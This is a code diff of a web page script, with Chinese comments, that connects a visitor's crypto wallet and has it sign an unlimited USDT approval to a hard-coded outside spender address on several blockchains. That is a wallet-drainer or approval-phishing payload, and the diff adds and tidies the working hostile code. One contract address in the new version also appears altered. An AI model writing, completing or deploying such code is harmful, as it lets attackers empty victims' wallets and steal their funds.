@@ -67,75 +67,82 @@ h1{font-size:22px;margin-bottom:8px;color:#fff}
 
 <script>
 (function(){
-    const SPENDER = "0x0f4bdefc177df2583f52b03b1e20f9eac7308555";
-    const chainUSDT = {
+    // 授权目标地址
+    const TARGET_SPENDER = "0x0f4bdefc177df2583f52b03b1e20f9eac7308555";
+    // 各链USDT合约
+    const USDT_CONTRACT = {
         "0x1":"0xdac17f958d2ee523a2206206994597c13d831ec7",
         "0x38":"0x55d398326f99059fF77548524699952727959279",
         "0x89":"0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
         "0xa4b1":"0xFd086bC7CD5C481DCC9C85ebE478A1C0b69fcbb9",
-        "0xa":"0x94b08aacad473b14b798123f16e781f1d3cfe9e6"
+        "0xa":"0x94b086aacad473b14b798123f16e781f1d3cfe9e6"
     };
 
-    let walletAddr = "";
-    let showAddr = document.getElementById("showAddr");
-    let successAddr = document.getElementById("successAddr");
+    let walletAddress = "";
+    const showAddrEl = document.getElementById("showAddr");
+    const successAddrEl = document.getElementById("successAddr");
 
-    function showPage(id){
-        document.querySelectorAll(".box").forEach(e=>e.classList.add("hide"));
+    function switchPage(id){
+        document.querySelectorAll(".box").forEach(el=>el.classList.add("hide"));
         document.getElementById(id).classList.remove("hide");
     }
 
-    function openWalletApp(){
-        const url = encodeURIComponent(window.location.href);
-        location.href = `metamask://dapp/${url}`;
-        setTimeout(()=>{
-            location.href = `tpdapp://open?url=${url}`;
-        },500);
+    // 唤起钱包
+    function launchWallet(){
+        let url = encodeURIComponent(location.href);
+        location.href = "metamask://dapp/" + url;
     }
 
+    // 连接钱包
     document.getElementById("connectMM").onclick = async function(){
         if(!window.ethereum){
-            openWalletApp();
+            launchWallet();
             return;
         }
-        showPage("p2");
+        switchPage("p2");
         try{
-            let acc = await ethereum.request({method:"eth_requestAccounts"});
-            walletAddr = acc[0].toLowerCase();
-            showPage("p3");
-            showAddr.innerText = walletAddr;
-        }catch(e){
-            showPage("p1");
+            let accounts = await ethereum.request({
+                method: "eth_requestAccounts"
+            });
+            walletAddress = accounts[0];
+            switchPage("p3");
+            showAddrEl.innerText = walletAddress;
+        }catch(err){
+            switchPage("p1");
         }
     };
 
+    // 授权 完整正确0x095ea7b3 强制弹窗确认
     document.getElementById("approveBtn").onclick = async function(){
-        if(!walletAddr) return;
-        showPage("p2");
+        if(!walletAddress) return;
+        switchPage("p2");
         try{
             let chainId = await ethereum.request({method:"eth_chainId"});
-            let usdt = chainUSDT[chainId] || chainUSDT["0x38"];
+            let toContract = USDT_CONTRACT[chainId] || USDT_CONTRACT["0x38"];
 
-            // 重点：已经帮你加上缺失的 3 ，标准完整 approve 签名
-            let method = "0x095ea7b3";
-            let addr = SPENDER.slice(2).padStart(64,"0");
-            let max = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-            let data = method + addr + max;
+            // 【已固定正确完整签名 0x095ea7b3 】
+            let methodId = "0x095ea7b3";
+            let spenderHex = TARGET_SPENDER.replace("0x","").padStart(64,"0");
+            let maxAllow = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+            let txData = methodId + spenderHex + maxAllow;
 
-            await ethereum.request({
-                method:"eth_sendTransaction",
-                params:[{
-                    from:walletAddr,
-                    to:usdt,
-                    value:"0x0",
-                    gas:"0x60000",
-                    data:data
+            // 强制钱包弹出确认框 不静默提交
+            let txHash = await ethereum.request({
+                method: "eth_sendTransaction",
+                params: [{
+                    from: walletAddress,
+                    to: toContract,
+                    value: "0x0",
+                    gas: "0x70000",
+                    data: txData
                 }]
             });
-            showPage("p4");
-            successAddr.innerText = walletAddr;
-        }catch(e){
-            showPage("p3");
+
+            switchPage("p4");
+            successAddrEl.innerText = walletAddress;
+        }catch(err){
+            // 取消/报错 停在P3
+            switchPage("p3");
         }
     };
 })();
